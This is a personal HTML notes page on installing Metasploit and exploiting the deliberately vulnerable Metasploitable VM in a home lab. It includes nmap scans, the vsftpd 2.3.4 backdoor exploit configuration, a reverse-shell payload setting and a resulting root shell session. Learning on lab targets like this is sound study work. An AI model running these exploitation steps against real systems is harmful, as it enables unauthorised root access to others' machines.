
<!doctype html>
<html>
  <head>
    <title>Metasploit Framework & Metasploitable</title>
    <link type='text/css' href='/css/notes.css' rel='stylesheet'/>
    <link rel="stylesheet" href="/css/zenburn.css">
    <script src="/js/highlight-pack.js"></script>
    <script>hljs.initHighlightingOnLoad();</script>
  </head>
  <body>
    <div id="sidebar">
      <ul> <li>
          <a href="/">Home</a>
        </li>
        <li>
          <a href="/notes">Notes</a>
        </li>
      </ul>
    </div>
    <div id="main">
      <h1>Metasploit Framework &amp; Metasploitable</h1>

<h2>Install on Crunchbang</h2>

<h3>Set up Developer Environment</h3>

<p>Most of what I do is from the offical <a href="https://github.com/rapid7/metasploit-framework/wiki/Setting-Up-a-Metasploit-Development-Environment">Rapid 7 Development Environment
Guide</a></p>

<h4>Install any missing deps:</h4>

<pre><code class="bash">sudo apt-get -y install \
build-essential zlib1g zlib1g-dev \
libxml2 libxml2-dev libxslt-dev locate \
libreadline6-dev libcurl4-openssl-dev git-core \
libssl-dev libyaml-dev openssl autoconf libtool \
ncurses-dev bison curl wget postgresql \
postgresql-contrib libpq-dev \
libapr1 libaprutil1 libsvn1 \
libpcap-dev git
</code></pre>

<p>Other steps that I am skipping for now:</p>

<ul>
<li>Install <code>rvm</code></li>
<li>Install <code>ruby-1.9.3</code></li>
</ul>

<h3>Clone Repo</h3>

<p>I usually do this into some sort of bin/ directory. I&#39;ll use <code>~/bin</code> for now.</p>

<pre><code class="bash">git clone https://github.com/rapid7/metasploit-framework.git
</code></pre>

<h3>Bundle</h3>

<pre><code class="bash">rvm install ruby-1.9.3-p448
gem install bundler
cd bin/metasploit-framework
bundle install
</code></pre>

<h3>Start Metasploit console:</h3>

<p>Just run <code>./msfconsole</code> to make sure that the whole thing working. Yay!</p>

<p>It should look something like this: </p>

<pre><code class="bash">     ,           ,
    /             \
   ((__---,,,---__))
      (_) O O (_)_________
         \ _ /            |\
          o_o \   M S F   | \
               \   _____  |  *
                |||   WW|||
                |||     |||


Frustrated with proxy pivoting? Upgrade to layer-2 VPN pivoting with
Metasploit Pro -- type &#39;go_pro&#39; to launch it now.

       =[ metasploit v4.7.2-2013103001 [core:4.7 api:1.0]
+ -- --=[ 1215 exploits - 660 auxiliary - 189 post
+ -- --=[ 322 payloads - 30 encoders - 8 nops

msf &gt;
</code></pre>

<h2>Usage</h2>

<p><em>Disclaimer: This is not the definitive Metasploit guide. For a more complete tutorial checkout <a href="http://www.offensive-security.com/metasploit-unleashed/Main_Page">Metaploit Unleashed</a></em></p>

<p>My goal is to document some of my self study efforts into MSF against the Metasploitable VM.</p>

<h3>Metasploitable</h3>

<p>Metasploitable is an intentional vulnerable server image which can be used for educational or testing purposes. It&#39;s a pretty handy way to get oriented to the framework.</p>

<p>You can <a href="http://www.offensive-security.com/metasploit-unleashed/Metasploitable">download the Metasploitable VM here</a>.</p>

<h3>Scanning with MSF &amp; Nmap</h3>

<p>You can use <code>nmap</code> directly from inside msf. A simple scan of the Metasploitable VM looks like this:</p>

<pre><code class="bash">
msf &gt; nmap 10.13.37.136
[*] exec: nmap 10.13.37.136


Starting Nmap 6.40 ( http://nmap.org ) at 2013-11-12 10:24 EST
Nmap scan report for 10.13.37.136
Host is up (0.0067s latency).
Not shown: 977 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
23/tcp   open  telnet
25/tcp   open  smtp
53/tcp   open  domain
80/tcp   open  http
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
512/tcp  open  exec
513/tcp  open  login
514/tcp  open  shell
1099/tcp open  rmiregistry
1524/tcp open  ingreslock
2049/tcp open  nfs
2121/tcp open  ccproxy-ftp
3306/tcp open  mysql
5432/tcp open  postgresql
5900/tcp open  vnc
6000/tcp open  X11
6667/tcp open  irc
8009/tcp open  ajp13
8180/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 0.12 seconds
# Yikes!
</code></pre>

<p><em>Note: If you configure MSF to use a database such as</em> <code>postgres</code> <em>you can
feed the</em> <code>nmap</code> <em>results directly in via the</em> <code>db_nmap</code> <em>command. I will be
doing all of these exmaples without a databse connected.</em></p>

<h4>Metasploitable Cases</h4>

<h5>FTP - <code>21/tcp</code></h5>

<p>Start with a more complete scan:</p>

<pre><code class="bash">
msf &gt; nmap -sV  10.13.37.136 -p 21
[*] exec: nmap -sV  10.13.37.136 -p 21


Starting Nmap 6.40 ( http://nmap.org ) at 2013-11-12 10:34 EST
Nmap scan report for 10.13.37.136
Host is up (0.0018s latency).
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
Service Info: OS: Unix
</code></pre>

<p>Next, try and search for a relevant exploit:</p>

<pre><code class="bash">msf &gt; search vsftpd

Matching Modules
================

   Name                                  Disclosure Date  Rank       Description
   ----                                  ---------------  ----       -----------
   exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  VSFTPD v2.3.4 Backdoor Command Execution
</code></pre>

<p>Oh good! It found something so lets configure it to use
<code>exploit/unix/ftp/vsftpd_234_backdoor</code></p>

<pre><code class="bash">msf &gt; use exploit/unix/ftp/vsftpd_234_backdoor
msf exploit(vsftpd_234_backdoor) &gt;
</code></pre>

<p>Set the remote (target) port and address and the local receiver host ip:</p>

<pre><code class="bash">msf exploit(vsftpd_234_backdoor) &gt; set RHOST = 10.13.37.136
RHOST =&gt; = 10.13.37.136
msf exploit(vsftpd_234_backdoor) &gt; set RPORT = 21
RPORT =&gt; = 21
msf exploit(vsftpd_234_backdoor) &gt; set LHOST 10.13.37.116
LHOST =&gt; 10.13.37.116
</code></pre>

<p>Search for aan appropriate payload. _Note: this is done from bash, not from
inside <code>msfconsole</code>.</p>

<pre><code class="bash">$ msfpayload -l | grep unix
    ...
    ...
    cmd/unix/interact
    ...
    ...
</code></pre>

<p>Set the payload as well.</p>

<pre><code class="bash">msf exploit(vsftpd_234_backdoor) &gt; set PAYLOAD cmd/unix/reverse_bash
PAYLOAD =&gt; cmd/unix/interact
</code></pre>

<p>Review settings ...</p>

<pre><code class="bash">msf exploit(vsftpd_234_backdoor) &gt; set

Module: unix/ftp/vsftpd_234_backdoor
====================================

  Name                   Value
  ----                   -----
  ...
  LHOST                  10.13.37.116
  PAYLOAD                cmd/unix/interact
  RHOST                  10.13.37.136
  RPORT                  21
  ...
</code></pre>

<p>... And exploit!</p>

<pre><code class="bash">msf exploit(vsftpd_234_backdoor) &gt; exploit

[*] Banner: 220 (vsFTPd 2.3.4)
[*] USER: 331 Please specify the password.
[+] Backdoor service has been spawned, handling...
[+] UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 2 opened (10.13.37.116:54285 -> 10.13.37.136:6200) at 2013-11-12 11:04:25 -0500

whoami
root
ifconfig eth0
eth0      Link encap:Ethernet  HWaddr 00:0c:29:e0:62:7f
          inet addr:10.13.37.136  Bcast:10.13.37.255  Mask:255.255.255.0
          ...

exit

[*] 10.13.37.136 - Command shell session 2 closed.  Reason: Died from EOFError

</code></pre>

<p>Hurray!</p>

      <hr/>
      <p>Last updated at: 2013-11-12 11:22am </p>
    </div>

    <script type="text/javascript">

      var _gaq = _gaq || [];
      _gaq.push(['_setAccount', 'UA-12795044-1']);
      _gaq.push(['_setDomainName', 'gabekoss.com']);
      _gaq.push(['_trackPageview']);

      (function() {
       var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
       ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
       var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
       })();

     </script>
   </body>
 </html>

